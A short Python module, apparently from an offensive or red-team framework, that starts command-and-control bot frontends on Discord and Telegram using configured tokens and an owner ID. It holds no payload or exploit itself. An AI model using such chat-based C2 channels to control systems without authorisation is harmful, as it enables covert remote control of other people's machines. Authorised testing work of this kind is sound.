"""CONTROL phase orchestrator — starts the configured C2 frontends."""
from __future__ import annotations

from pathlib import Path
from typing import Any

from lib.config import Config
from lib.logger import get_logger
from phases.control.discord_c2 import DiscordC2, build_default_router as build_discord_router
from phases.control.telegram_c2 import TelegramC2, build_default_router as build_telegram_router

logger = get_logger("c2_orchestrator")


def run_control(cfg: Config, logs_path: Path | None = None) -> dict[str, Any]:
    """Start enabled C2 frontends. Returns per-channel status."""
    c2_cfg = cfg.c2_bot or {}
    if not c2_cfg.get("enabled", False):
        return {"status": "disabled", "reason": "c2_bot.enabled is false"}

    owner_id = cfg.env.get("C2_OWNER_ID", "") or cfg.env.get("TELEGRAM_CHAT_ID", "")
    channels = [str(c).lower() for c in (c2_cfg.get("channels") or [])]
    results: dict[str, Any] = {}

    if "discord" in channels:
        token = cfg.env.get("DISCORD_BOT_TOKEN", "")
        router = build_discord_router(owner_id, logs_path=logs_path)
        results["discord"] = DiscordC2(router, bot_token=token).start()

    if "telegram" in channels:
        token, chat_id = cfg.telegram()
        router = build_telegram_router(owner_id or chat_id, logs_path=logs_path)
        results["telegram"] = TelegramC2(router, bot_token=token, chat_id=chat_id).start()

    return {"status": "ok", "channels": results}
